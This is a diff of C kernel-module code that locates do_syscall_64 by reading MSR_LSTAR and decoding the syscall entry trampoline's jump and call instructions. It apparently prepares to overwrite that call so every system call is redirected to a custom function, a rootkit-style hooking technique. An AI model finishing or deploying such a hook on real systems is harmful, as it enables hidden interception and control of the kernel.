@@ -11,24 +11,29 @@
 //Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
 //(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64
 
-//sign-extended mov rdi, imm
+//sign-extended mov rdi, imm; 0x48 is REX.W prefix
 static char *movSignExtended = "\x48\xc7\xc7";
 
 //The first call in entry_SYSCALL_64 is the right one, so grabbing it is easy
 static char *callNearRelative = "\xE8";
 
 static unsigned long read_msr(unsigned int);
-static void *find_do_syscall_64(char *lstar_addr);
+static char *find_do_syscall_64(char *lstar_addr);
 
 void g7_syscall_64(unsigned long, struct pt_regs *);
 void (*do_syscall_64)(unsigned long, struct pt_regs *);
 
 void
 test_lstar(void)
-{   
-    char *lstar_addr = (char *)read_msr(MSR_LSTAR);
-    
-    do_syscall_64 = find_do_syscall_64(lstar_addr);
+{      
+    char *syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
+
+    if(!do_syscall_64 || !syscall_64_ptr)
+        return;
+
+    DEBUG_INFO("do_syscall_64 at %lx\n", (unsigned long)do_syscall_64);
+
+    //Calculate new call offset to our function
 }
 
 //Only use with multiples of 16..
@@ -55,7 +60,24 @@ sign_extend(int n)
     return n;
 }
 
-static void *
+//Get sign-extended offset from near relative call in memory (\xe8)
+static unsigned long
+call_offset(char *ptr)
+{
+    unsigned long ret = 0;
+
+    memcpy(&ret, (ptr + 1), 4); //1 byte offset to skip opcode)
+
+    ret = sign_extend(ret);
+
+    //Offset relative to _next_ instruction
+    ret += 5;
+     
+    return ret;
+}
+
+//Find do_syscall_64, sets it, and returns the pointer to the original call
+static char *
 find_do_syscall_64(char *lstar_addr)
 {
     //Step 1: get address of stage 2 trampoline
@@ -71,21 +93,18 @@ find_do_syscall_64(char *lstar_addr)
     stage2_addr = sign_extend(stage2_addr);
 
     //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
-    char *syscall64_off_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);
+    char *syscall64_call_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);
 
-    if(!syscall64_off_ptr)
+    if(!syscall64_call_ptr)
         return NULL;
 
-    unsigned long syscall64_off = 0;
-    memcpy(&syscall64_off, (syscall64_off_ptr + 1), 4); //1 byte offset to skip opcode
-
-    syscall64_off = sign_extend(syscall64_off);
-
-    //Offset relative to _next_ instruction
-    syscall64_off += 5;
+    //Get offset relative to next address
+    unsigned long syscall64_off = call_offset(syscall64_call_ptr);
 
     //Store correct address of do_syscall_64
-    return (void *)syscall64_off_ptr + syscall64_off;
+    do_syscall_64 = (void *)syscall64_call_ptr + syscall64_off;
+
+    return syscall64_call_ptr;
 }
 
 void
